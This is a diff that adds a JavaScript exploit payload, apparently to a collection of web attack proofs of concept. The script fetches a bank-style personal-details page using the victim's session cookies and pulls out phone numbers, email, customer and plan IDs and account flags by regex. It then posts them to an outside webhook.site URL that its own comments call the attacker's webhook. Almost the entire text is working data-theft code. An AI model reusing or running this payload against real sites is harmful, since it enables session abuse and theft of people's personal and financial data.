@@ -59,3 +59,44 @@ https://███████.███████.mil/kc/main/pop_up_frm.asp?l
     .catch(err => console.log("Exploit failed", err));
 </script>
 
+
+
+<script>
+    var target = "https://my.example.co.uk/PlanReviewAct/PersonalDetailsConfirm.asp"; // Target URL
+
+    fetch(target, {
+        method: "GET",
+        credentials: "include"  // Steal data using victim's session cookies
+    })
+    .then(response => response.text())
+    .then(data => {
+        // Extracting form field values using regex
+        var extractedData = {};
+        var fields = [
+            "Occupation", "HomeTelCode", "HomeTelNumber", "WorkTelCode", "WorkTelNumber", "WorkTelExtn",
+            "MobileTelNumber", "EmailAddress", "PreferredContactMethod", "PreferredContactTime",
+            "PreferredContactTimeDayTime", "CustomerID", "PlanID", "hdnSelectedAccountId", "hdnSelectedNickname",
+            "hdnSelectedMortage", "hdnSelectedLoans", "hdnSelectedCreditCard", "hdnShowMeSavings", "hdnShowMeMortage",
+            "hdnShowMeLoans", "hdnShowMeCreditCard"
+        ];
+
+        fields.forEach(field => {
+            let regex = new RegExp(`<input[^>]*name=["']${field}["'][^>]*value=["']([^"']+)["']`, "i");
+            let match = data.match(regex);
+            extractedData[field] = match ? match[1] : "Not Found";
+        });
+
+        // Sending stolen data to attacker's webhook
+        fetch("https://webhook.site/57eb2c23-a022-417e-9cae-a4deb04a5d2c", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                stolenData: extractedData,
+                victimIP: window.location.hostname,
+                timestamp: new Date().toISOString()
+            })
+        });
+    })
+    .catch(err => console.log("Exploit failed", err));
+</script>
+
